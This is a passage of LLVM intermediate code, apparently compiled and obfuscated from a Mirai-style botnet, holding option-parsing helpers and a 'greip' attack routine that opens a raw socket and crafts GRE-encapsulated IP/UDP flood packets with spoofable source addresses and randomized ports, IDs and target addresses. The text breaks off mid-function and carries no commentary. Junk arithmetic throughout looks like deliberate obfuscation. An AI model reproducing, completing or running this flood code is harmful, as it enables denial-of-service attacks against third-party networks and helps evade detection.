; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %35, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %42

; <label>:16:                                     ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

; <label>:27:                                     ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %44

; <label>:34:                                     ; preds = %16
  br label %35

; <label>:35:                                     ; preds = %34
  %36 = load i32, i32* %10, align 4
  %37 = sub i32 0, %36
  %38 = sub i32 0, 1
  %39 = add i32 %37, %38
  %40 = sub i32 0, %39
  %41 = add nsw i32 %36, 1
  store i32 %40, i32* %10, align 4
  br label %11

; <label>:42:                                     ; preds = %11
  %43 = load i8*, i8** %9, align 8
  store i8* %43, i8** %5, align 8
  br label %44

; <label>:44:                                     ; preds = %42, %27
  %45 = load i8*, i8** %5, align 8
  ret i8* %45
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* %20, i32 10)
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @inet_addr(i8* %20) #6
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.grehdr*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %33 = load i8, i8* %5, align 1
  %34 = zext i8 %33 to i64
  %35 = call noalias i8* @calloc(i64 %34, i64 8) #6
  %36 = bitcast i8* %35 to i8**
  store i8** %36, i8*** %11, align 8
  %37 = load i8, i8* %7, align 1
  %38 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %39 = call i32 @attack_get_opt_int(i8 zeroext %37, %struct.attack_option* %38, i8 zeroext 2, i32 0)
  %40 = trunc i32 %39 to i8
  store i8 %40, i8* %12, align 1
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 3, i32 65535)
  %44 = trunc i32 %43 to i16
  store i16 %44, i16* %13, align 2
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 4, i32 64)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 5, i32 1)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %15, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 6, i32 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %16, align 2
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 7, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %17, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 0, i32 512)
  store i32 %63, i32* %18, align 4
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 1, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %19, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 19, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = load i32, i32* @LOCAL_ADDR, align 4
  %75 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 25, i32 %74)
  store i32 %75, i32* %21, align 4
  %76 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %76, i32* %10, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %79

; <label>:78:                                     ; preds = %4
  br label %548

; <label>:79:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %80 = load i32, i32* %10, align 4
  %81 = bitcast i32* %9 to i8*
  %82 = call i32 @setsockopt(i32 %80, i32 0, i32 3, i8* %81, i32 4) #6
  %83 = icmp eq i32 %82, -1
  br i1 %83, label %84, label %87

; <label>:84:                                     ; preds = %79
  %85 = load i32, i32* %10, align 4
  %86 = call i32 @close(i32 %85)
  br label %548

; <label>:87:                                     ; preds = %79
  store i32 0, i32* %9, align 4
  br label %88

; <label>:88:                                     ; preds = %315, %87
  %89 = load i32, i32* %9, align 4
  %90 = load i8, i8* %5, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp slt i32 %89, %91
  br i1 %92, label %93, label %322

; <label>:93:                                     ; preds = %88
  %94 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %95 = load i8**, i8*** %11, align 8
  %96 = load i32, i32* %9, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8*, i8** %95, i64 %97
  store i8* %94, i8** %98, align 8
  %99 = load i8**, i8*** %11, align 8
  %100 = load i32, i32* %9, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8*, i8** %99, i64 %101
  %103 = load i8*, i8** %102, align 8
  %104 = bitcast i8* %103 to %struct.iphdr*
  store %struct.iphdr* %104, %struct.iphdr** %22, align 8
  %105 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %106 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %105, i64 1
  %107 = bitcast %struct.iphdr* %106 to %struct.grehdr*
  store %struct.grehdr* %107, %struct.grehdr** %23, align 8
  %108 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %109 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %108, i64 1
  %110 = bitcast %struct.grehdr* %109 to %struct.iphdr*
  store %struct.iphdr* %110, %struct.iphdr** %24, align 8
  %111 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %112 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %111, i64 1
  %113 = bitcast %struct.iphdr* %112 to %struct.udphdr*
  store %struct.udphdr* %113, %struct.udphdr** %25, align 8
  %114 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %115 = bitcast %struct.iphdr* %114 to i8*
  %116 = load i8, i8* %115, align 4
  %117 = xor i8 15, -1
  %118 = xor i8 %116, %117
  %119 = and i8 %118, %116
  %120 = and i8 %116, 15
  %121 = and i8 %119, 64
  %122 = xor i8 %119, 64
  %123 = or i8 %121, %122
  %124 = or i8 %119, 64
  store i8 %123, i8* %115, align 4
  %125 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %126 = bitcast %struct.iphdr* %125 to i8*
  %127 = load i8, i8* %126, align 4
  %128 = xor i8 %127, -1
  %129 = xor i8 -16, -1
  %130 = xor i8 -120, -1
  %131 = or i8 %128, %129
  %132 = or i8 -120, %130
  %133 = xor i8 %131, -1
  %134 = and i8 %133, %132
  %135 = and i8 %127, -16
  %136 = xor i8 %134, -1
  %137 = xor i8 5, -1
  %138 = xor i8 -32, -1
  %139 = and i8 %136, -32
  %140 = and i8 %134, %138
  %141 = and i8 %137, -32
  %142 = and i8 5, %138
  %143 = or i8 %139, %140
  %144 = or i8 %141, %142
  %145 = xor i8 %143, %144
  %146 = or i8 %136, %137
  %147 = xor i8 %146, -1
  %148 = or i8 -32, %138
  %149 = and i8 %147, %148
  %150 = or i8 %145, %149
  %151 = or i8 %134, 5
  store i8 %150, i8* %126, align 4
  %152 = load i8, i8* %12, align 1
  %153 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 1
  store i8 %152, i8* %154, align 1
  %155 = load i32, i32* %18, align 4
  %156 = sext i32 %155 to i64
  %157 = sub i64 0, %156
  %158 = sub i64 52, %157
  %159 = add i64 52, %156
  %160 = trunc i64 %158 to i16
  %161 = call zeroext i16 @htons(i16 zeroext %160) #7
  %162 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 2
  store i16 %161, i16* %163, align 2
  %164 = load i16, i16* %13, align 2
  %165 = call zeroext i16 @htons(i16 zeroext %164) #7
  %166 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 3
  store i16 %165, i16* %167, align 4
  %168 = load i8, i8* %14, align 1
  %169 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 5
  store i8 %168, i8* %170, align 4
  %171 = load i8, i8* %15, align 1
  %172 = icmp ne i8 %171, 0
  br i1 %172, label %173, label %177

; <label>:173:                                    ; preds = %93
  %174 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %175 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 4
  store i16 %174, i16* %176, align 2
  br label %177

; <label>:177:                                    ; preds = %173, %93
  %178 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 6
  store i8 47, i8* %179, align 1
  %180 = load i32, i32* %21, align 4
  %181 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 8
  store i32 %180, i32* %182, align 4
  %183 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %184 = load i32, i32* %9, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %183, i64 %185
  %187 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %186, i32 0, i32 1
  %188 = load i32, i32* %187, align 4
  %189 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 9
  store i32 %188, i32* %190, align 4
  %191 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %192 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %193 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %192, i32 0, i32 1
  store i16 %191, i16* %193, align 2
  %194 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %195 = bitcast %struct.iphdr* %194 to i8*
  %196 = load i8, i8* %195, align 4
  %197 = xor i8 15, -1
  %198 = xor i8 %196, %197
  %199 = and i8 %198, %196
  %200 = and i8 %196, 15
  %201 = and i8 %199, 64
  %202 = xor i8 %199, 64
  %203 = or i8 %201, %202
  %204 = or i8 %199, 64
  store i8 %203, i8* %195, align 4
  %205 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %206 = bitcast %struct.iphdr* %205 to i8*
  %207 = load i8, i8* %206, align 4
  %208 = xor i8 -16, -1
  %209 = xor i8 %207, %208
  %210 = and i8 %209, %207
  %211 = and i8 %207, -16
  %212 = xor i8 %210, -1
  %213 = xor i8 5, -1
  %214 = xor i8 -70, -1
  %215 = and i8 %212, -70
  %216 = and i8 %210, %214
  %217 = and i8 %213, -70
  %218 = and i8 5, %214
  %219 = or i8 %215, %216
  %220 = or i8 %217, %218
  %221 = xor i8 %219, %220
  %222 = or i8 %212, %213
  %223 = xor i8 %222, -1
  %224 = or i8 -70, %214
  %225 = and i8 %223, %224
  %226 = or i8 %221, %225
  %227 = or i8 %210, 5
  store i8 %226, i8* %206, align 4
  %228 = load i8, i8* %12, align 1
  %229 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %230 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %229, i32 0, i32 1
  store i8 %228, i8* %230, align 1
  %231 = load i32, i32* %18, align 4
  %232 = sext i32 %231 to i64
  %233 = add i64 28, 584975823701840018
  %234 = add i64 %233, %232
  %235 = sub i64 %234, 584975823701840018
  %236 = add i64 28, %232
  %237 = trunc i64 %235 to i16
  %238 = call zeroext i16 @htons(i16 zeroext %237) #7
  %239 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %240 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %239, i32 0, i32 2
  store i16 %238, i16* %240, align 2
  %241 = load i16, i16* %13, align 2
  %242 = zext i16 %241 to i32
  %243 = xor i32 %242, -1
  %244 = and i32 -1, %243
  %245 = xor i32 -1, -1
  %246 = and i32 %242, %245
  %247 = or i32 %244, %246
  %248 = xor i32 %242, -1
  %249 = trunc i32 %247 to i16
  %250 = call zeroext i16 @htons(i16 zeroext %249) #7
  %251 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %252 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %251, i32 0, i32 3
  store i16 %250, i16* %252, align 4
  %253 = load i8, i8* %14, align 1
  %254 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %255 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %254, i32 0, i32 5
  store i8 %253, i8* %255, align 4
  %256 = load i8, i8* %15, align 1
  %257 = icmp ne i8 %256, 0
  br i1 %257, label %258, label %262

; <label>:258:                                    ; preds = %177
  %259 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %260 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %261 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %260, i32 0, i32 4
  store i16 %259, i16* %261, align 2
  br label %262

; <label>:262:                                    ; preds = %258, %177
  %263 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %264 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %263, i32 0, i32 6
  store i8 17, i8* %264, align 1
  %265 = call i32 @rand_next()
  %266 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %267 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %266, i32 0, i32 8
  store i32 %265, i32* %267, align 4
  %268 = load i8, i8* %20, align 1
  %269 = icmp ne i8 %268, 0
  br i1 %269, label %270, label %276

; <label>:270:                                    ; preds = %262
  %271 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i32 0, i32 9
  %273 = load i32, i32* %272, align 4
  %274 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 9
  store i32 %273, i32* %275, align 4
  br label %296

; <label>:276:                                    ; preds = %262
  %277 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %278 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %277, i32 0, i32 8
  %279 = load i32, i32* %278, align 4
  %280 = sub i32 0, 1024
  %281 = add i32 %279, %280
  %282 = sub i32 %279, 1024
  %283 = xor i32 %281, -1
  %284 = and i32 809996316, %283
  %285 = xor i32 809996316, -1
  %286 = and i32 %281, %285
  %287 = xor i32 -1, -1
  %288 = and i32 %287, 809996316
  %289 = and i32 -1, %285
  %290 = or i32 %284, %286
  %291 = or i32 %288, %289
  %292 = xor i32 %290, %291
  %293 = xor i32 %281, -1
  %294 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %295 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %294, i32 0, i32 9
  store i32 %292, i32* %295, align 4
  br label %296

; <label>:296:                                    ; preds = %276, %270
  %297 = load i16, i16* %16, align 2
  %298 = call zeroext i16 @htons(i16 zeroext %297) #7
  %299 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %300 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %299, i32 0, i32 0
  store i16 %298, i16* %300, align 2
  %301 = load i16, i16* %17, align 2
  %302 = call zeroext i16 @htons(i16 zeroext %301) #7
  %303 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %304 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %303, i32 0, i32 1
  store i16 %302, i16* %304, align 2
  %305 = load i32, i32* %18, align 4
  %306 = sext i32 %305 to i64
  %307 = sub i64 8, -7610004902844808114
  %308 = add i64 %307, %306
  %309 = add i64 %308, -7610004902844808114
  %310 = add i64 8, %306
  %311 = trunc i64 %309 to i16
  %312 = call zeroext i16 @htons(i16 zeroext %311) #7
  %313 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %314 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %313, i32 0, i32 2
  store i16 %312, i16* %314, align 2
  br label %315

; <label>:315:                                    ; preds = %296
  %316 = load i32, i32* %9, align 4
  %317 = sub i32 0, %316
  %318 = sub i32 0, 1
  %319 = add i32 %317, %318
  %320 = sub i32 0, %319
  %321 = add nsw i32 %316, 1
  store i32 %320, i32* %9, align 4
  br label %88

; <label>:322:                                    ; preds = %88
  br label %323

; <label>:323:                                    ; preds = %547, %322
  store i32 0, i32* %9, align 4
  br label %324

; <label>:324:                                    ; preds = %541, %323
  %325 = load i32, i32* %9, align 4
  %326 = load i8, i8* %5, align 1
  %327 = zext i8 %326 to i32
  %328 = icmp slt i32 %325, %327
  br i1 %328, label %329, label %547

; <label>:329:                                    ; preds = %324
  %330 = load i8**, i8*** %11, align 8
  %331 = load i32, i32* %9, align 4
  %332 = sext i32 %331 to i64
  %333 = getelementptr inbounds i8*, i8** %330, i64 %332
  %334 = load i8*, i8** %333, align 8
  store i8* %334, i8** %26, align 8
  %335 = load i8*, i8** %26, align 8
  %336 = bitcast i8* %335 to %struct.iphdr*
  store %struct.iphdr* %336, %struct.iphdr** %27, align 8
  %337 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %338 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %337, i64 1
  %339 = bitcast %struct.iphdr* %338 to %struct.grehdr*
  store %struct.grehdr* %339, %struct.grehdr** %28, align 8
  %340 = load %struct.grehdr*, %struct.grehdr** %28, align 8
  %341 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %340, i64 1
  %342 = bitcast %struct.grehdr* %341 to %struct.iphdr*
  store %struct.iphdr* %342, %struct.iphdr** %29, align 8
  %343 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %344 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %343, i64 1
  %345 = bitcast %struct.iphdr* %344 to %struct.udphdr*
  store %struct.udphdr* %345, %struct.udphdr** %30, align 8
  %346 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %347 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %346, i64 1
  %348 = bitcast %struct.udphdr* %347 to i8*
  store i8* %348, i8** %31, align 8
  %349 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %350 = load i32, i32* %9, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %349, i64 %351
  %353 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %352, i32 0, i32 2
  %354 = load i8, i8* %353, align 4
  %355 = zext i8 %354 to i32
  %356 = icmp slt i32 %355, 32
  br i1 %356, label %357, label %381

; <label>:357:                                    ; preds = %329
  %358 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %359 = load i32, i32* %9, align 4
  %360 = sext i32 %359 to i64
  %361 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %358, i64 %360
  %362 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %361, i32 0, i32 1
  %363 = load i32, i32* %362, align 4
  %364 = call i32 @ntohl(i32 %363) #7
  %365 = call i32 @rand_next()
  %366 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %367 = load i32, i32* %9, align 4
  %368 = sext i32 %367 to i64
  %369 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %366, i64 %368
  %370 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %369, i32 0, i32 2
  %371 = load i8, i8* %370, align 4
  %372 = zext i8 %371 to i32
  %373 = lshr i32 %365, %372
  %374 = sub i32 %364, 2134144982
  %375 = add i32 %374, %373
  %376 = add i32 %375, 2134144982
  %377 = add i32 %364, %373
  %378 = call i32 @htonl(i32 %376) #7
  %379 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %380 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %379, i32 0, i32 9
  store i32 %378, i32* %380, align 4
  br label %381

; <label>:381:                                    ; preds = %357, %329
  %382 = load i32, i32* %21, align 4
  %383 = icmp eq i32 %382, -1
  br i1 %383, label %384, label %388

; <label>:384:                                    ; preds = %381
  %385 = call i32 @rand_next()
  %386 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %387 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %386, i32 0, i32 8
  store i32 %385, i32* %387, align 4
  br label %388

; <label>:388:                                    ; preds = %384, %381
  %389 = load i16, i16* %13, align 2
  %390 = zext i16 %389 to i32
  %391 = icmp eq i32 %390, 65535
  br i1 %391, label %392, label %418

; <label>:392:                                    ; preds = %388
  %393 = call i32 @rand_next()
  %394 = xor i32 65535, -1
  %395 = xor i32 %393, %394
  %396 = and i32 %395, %393
  %397 = and i32 %393, 65535
  %398 = trunc i32 %396 to i16
  %399 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %400 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %399, i32 0, i32 3
  store i16 %398, i16* %400, align 4
  %401 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %402 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %401, i32 0, i32 3
  %403 = load i16, i16* %402, align 4
  %404 = zext i16 %403 to i32
  %405 = sub i32 %404, -2030927105
  %406 = sub i32 %405, 1000
  %407 = add i32 %406, -2030927105
  %408 = sub nsw i32 %404, 1000
  %409 = xor i32 %407, -1
  %410 = and i32 -1, %409
  %411 = xor i32 -1, -1
  %412 = and i32 %407, %411
  %413 = or i32 %410, %412
  %414 = xor i32 %407, -1
  %415 = trunc i32 %413 to i16
  %416 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %417 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %416, i32 0, i32 3
  store i16 %415, i16* %417, align 4
  br label %418

; <label>:418:                                    ; preds = %392, %388
  %419 = load i16, i16* %16, align 2
  %420 = zext i16 %419 to i32
  %421 = icmp eq i32 %420, 65535
  br i1 %421, label %422, label %431

; <label>:422:                                    ; preds = %418
  %423 = call i32 @rand_next()
  %424 = xor i32 65535, -1
  %425 = xor i32 %423, %424
  %426 = and i32 %425, %423
  %427 = and i32 %423, 65535
  %428 = trunc i32 %426 to i16
  %429 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %430 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %429, i32 0, i32 0
  store i16 %428, i16* %430, align 2
  br label %431

; <label>:431:                                    ; preds = %422, %418
  %432 = load i16, i16* %17, align 2
  %433 = zext i16 %432 to i32
  %434 = icmp eq i32 %433, 65535
  br i1 %434, label %435, label %448

; <label>:435:                                    ; preds = %431
  %436 = call i32 @rand_next()
  %437 = xor i32 %436, -1
  %438 = xor i32 65535, -1
  %439 = xor i32 -11383317, -1
  %440 = or i32 %437, %438
  %441 = or i32 -11383317, %439
  %442 = xor i32 %440, -1
  %443 = and i32 %442, %441
  %444 = and i32 %436, 65535
  %445 = trunc i32 %443 to i16
  %446 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %447 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %446, i32 0, i32 1
  store i16 %445, i16* %447, align 2
  br label %448

; <label>:448:                                    ; preds = %435, %431
  %449 = load i8, i8* %20, align 1
  %450 = icmp ne i8 %449, 0
  br i1 %450, label %455, label %451

; <label>:451:                                    ; preds = %448
  %452 = call i32 @rand_next()
  %453 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %454 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %453, i32 0, i32 9
  store i32 %452, i32* %454, align 4
  br label %461

; <label>:455:                                    ; preds = %448
  %456 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %457 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %456, i32 0, i32 9
  %458 = load i32, i32* %457, align 4
  %459 = load %struct.iphdr*, %struct.iphdr** %29, align 8
